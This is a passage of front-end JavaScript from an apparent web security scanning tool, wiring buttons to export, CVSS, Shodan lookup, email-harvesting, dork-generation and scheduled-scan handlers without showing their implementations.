    // Scan Compare
    $("scanCompareBtn")?.addEventListener("click", compareScans);

    // CVSS
    $("cvssCalcBtn")?.addEventListener("click", calculateCVSS);

    // More Exports
    document.querySelectorAll(".export-btn").forEach(btn => {
      btn.addEventListener("click", () => {
        const format = btn.dataset.format;
        if (format === "nmap") exportNmapXML();
        else if (format === "nikto") exportNiktoCSV();
        else if (format === "nessus") exportNessus();
        else if (format === "markdown") exportMarkdownReport();
        else if (format === "htmltable") exportHTMLTable();
        else if (format === "csvfull") exportFullCSV();
      });
    });

    // Screenshots
    $("screenshotBtn")?.addEventListener("click", captureScreenshot);

    // Plugins
    $("pluginRun")?.addEventListener("click", runPlugin);
    $("pluginSave")?.addEventListener("click", savePlugin);
    $("pluginLoad")?.addEventListener("click", renderSavedPlugins);

    // Custom Checks
    $("customCheckAdd")?.addEventListener("click", addCustomCheck);

    // Vuln DB
    $("vulnDbSearch")?.addEventListener("input", searchVulnDb);
    searchVulnDb();

    // GitHub Dork
    $("githubDorkGenBtn")?.addEventListener("click", generateGitHubDorks);

    // Email Harvest
    $("emailHarvestBtn")?.addEventListener("click", harvestEmails);

    // Phone Detect
    $("phoneDetectBtn")?.addEventListener("click", detectPII);

    // Wayback Deep
    $("waybackDeepBtn")?.addEventListener("click", analyzeWayback);

    // Shodan
    $("shodanLookupBtn")?.addEventListener("click", shodanLookup);

    // Schedule
    $("scheduleStart")?.addEventListener("click", () => {
      const url = $("scheduleUrl")?.value?.trim();
      const interval = parseInt($("scheduleInterval")?.value || "300000");
      if (!url) { toast("Enter a target URL", "error"); return; }
      scheduleTimer = setInterval(() => {
        const log = $("scheduleLog");
        if (log) log.innerHTML += `<div>${new Date().toLocaleTimeString()} — Scanning ${esc(url)}</div>`;
        // Trigger scan via existing functionality
      }, interval);
      $("scheduleStart").style.display = "none";
      $("scheduleStop").style.display = "inline-flex";
      toast("Scheduled scan started", "success");
    });

    $("scheduleStop")?.addEventListener("click", () => {
      clearInterval(scheduleTimer);
      $("scheduleStart").style.display = "inline-flex";
      $("scheduleStop").style.display = "none";
      toast("Scheduled scan stopped", "info");
    });
  });
})();
